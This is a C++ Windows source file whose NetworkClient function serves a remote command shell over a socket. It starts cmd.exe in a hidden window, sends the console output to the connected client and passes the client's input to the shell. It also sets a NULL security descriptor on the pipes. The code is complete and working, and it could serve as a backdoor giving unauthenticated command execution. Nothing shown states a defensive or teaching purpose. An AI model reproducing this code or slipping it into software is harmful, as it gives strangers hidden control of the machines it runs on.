#include "stdafx.h"

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>

#include <iostream>
#include <codecvt>
#include <locale> 
#include "win32.h"
#include "log.h"
#include "netclient.h"
using namespace std;

unsigned int gNetClientIndex = 0;
extern SOCKET client_socket[10];
extern int max_clients;
DWORD WINAPI NetworkClient(LPVOID lpParam)
{
  char buf[1024];           //i/o buffer

  SOCKET theSck = (SOCKET)lpParam;
  int currIndex = gNetClientIndex;
  int receivedBytes, sentBytes = 0;
  STARTUPINFO si;
  SECURITY_ATTRIBUTES sa;
  SECURITY_DESCRIPTOR sd;               //security information for pipes
  PROCESS_INFORMATION pi;
  HANDLE newstdin,newstdout,read_stdout,write_stdin;  //pipe handles

  //Send socket some info
  if(send(theSck, "Remote Shell\r\n\r\n", sizeof("Remote Shell\r\n\r\n"), 0) == SOCKET_ERROR) goto closeSck;
    

  if (IsWinNT())        //initialize security descriptor (Windows NT)
  {
    InitializeSecurityDescriptor(&sd,SECURITY_DESCRIPTOR_REVISION);
    SetSecurityDescriptorDacl(&sd, true, NULL, false);
    sa.lpSecurityDescriptor = &sd;
  }
  else sa.lpSecurityDescriptor = NULL;
  sa.nLength = sizeof(SECURITY_ATTRIBUTES);
  sa.bInheritHandle = true;         //allow inheritable handles

  if (!CreatePipe(&newstdin,&write_stdin,&sa,0))   //create stdin pipe
  {
    ErrorMessage("CreatePipe");
    return RET_ERROR;
  }
  if (!CreatePipe(&read_stdout,&newstdout,&sa,0))  //create stdout pipe
  {
    ErrorMessage("CreatePipe");
    
    CloseHandle(newstdin);
    CloseHandle(write_stdin);
    return RET_ERROR;
  }

  GetStartupInfo(&si);      //set startupinfo for the spawned process
  /*
  The dwFlags member tells CreateProcess how to make the process.
  STARTF_USESTDHANDLES validates the hStd* members. STARTF_USESHOWWINDOW
  validates the wShowWindow member.
  */
  si.dwFlags = STARTF_USESTDHANDLES|STARTF_USESHOWWINDOW;
  si.wShowWindow = SW_HIDE;
  si.hStdOutput = newstdout;
  si.hStdError = newstdout;     //set the new handles for the child process
  si.hStdInput = newstdin;
  char app_spawn[] = "c:\\Windows\\System32\\cmd.exe"; //sample, modify for your
                                                     //system

  //spawn the child process
  if (!CreateProcess(app_spawn,NULL,NULL,NULL,TRUE,CREATE_NEW_CONSOLE,
                     NULL,NULL,&si,&pi))
  {
    ErrorMessage("CreateProcess");
    getch();
    CloseHandle(newstdin);
    CloseHandle(newstdout);
    CloseHandle(read_stdout);
    CloseHandle(write_stdin);
    return RET_ERROR;
  }

  unsigned long exit=0;  //process exit code
  unsigned long bread;   //bytes read
  unsigned long avail;   //bytes available

  bzero(buf);
  for(;;)      //main program loop
  {
    Sleep(10);
    GetExitCodeProcess(pi.hProcess,&exit);      //while the process is running
    if (exit != STILL_ACTIVE)
      break;
    PeekNamedPipe(read_stdout,buf,1023,&bread,&avail,NULL);
    //check to see if there is any data to read from stdout
    if (bread != 0)
    {
      bzero(buf);
      if (avail > 1023)
      {
        while (bread >= 1023)
        {
          ReadFile(read_stdout,buf,1023,&bread,NULL);  //read the stdout pipe
          LOG_TRACE("NetworkClient::1","%s",(char*)buf);
          sentBytes = send(theSck, buf, strlen(buf), 0);
          LOG_TRACE("NetworkClient::send1","send %d bytes",sentBytes);
          bzero(buf);
        }

      }
      else {
        ReadFile(read_stdout,buf,1023,&bread,NULL);
        LOG_TRACE("NetworkClient::2","%s",(char*)buf);
        sentBytes = send(theSck, buf, strlen(buf), 0);
        LOG_TRACE("NetworkClient::send2","send %d bytes",sentBytes);
      }
    }
    bzero(buf);
    //get details of the client
    

    receivedBytes = recv(theSck, buf, sizeof(buf), 0);
    if (receivedBytes == SOCKET_ERROR)
    {
      int error_code = WSAGetLastError();
      if (error_code == WSAECONNRESET)
      {
          //Somebody disconnected , get his details and print
          _NETPRINTF("Host disconnected unexpectedly\n");
          goto closeSck; 
      }
      else
      {
          _NETPRINTF("recv failed with error code : %d", error_code);
      }
    }
    else if (receivedBytes == 0)
    {
        //Somebody disconnected , get his details and print
        _NETPRINTF("Host disconnected\n");
        goto closeSck; 
    }
    else if (receivedBytes)      //check for user input.
    {
      LOG_TRACE("NetworkClient","bread %d, receivedBytes %d",bread, receivedBytes);
      LOG_TRACE("NetworkClient","%s",(char*)buf);
      WriteFile(write_stdin,buf,receivedBytes,&bread,NULL); //send it to stdin
      if (*buf == '\r') {
        *buf = '\n';
        LOG_TRACE("NetworkClient","%s",(char*)buf);
        WriteFile(write_stdin,buf,receivedBytes,&bread,NULL); //send an extra newline char,
                                                  //if necessary
      }
    }
  }

  //Cleaning up functions
  closeSck:
    TerminateProcess(pi.hProcess, 0);
    closesocket(theSck);
    client_socket[currIndex] = 0;
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    CloseHandle(newstdin);            //clean stuff up
    CloseHandle(newstdout);
    CloseHandle(read_stdout);
    CloseHandle(write_stdin);

  return RET_SUCCESS;
}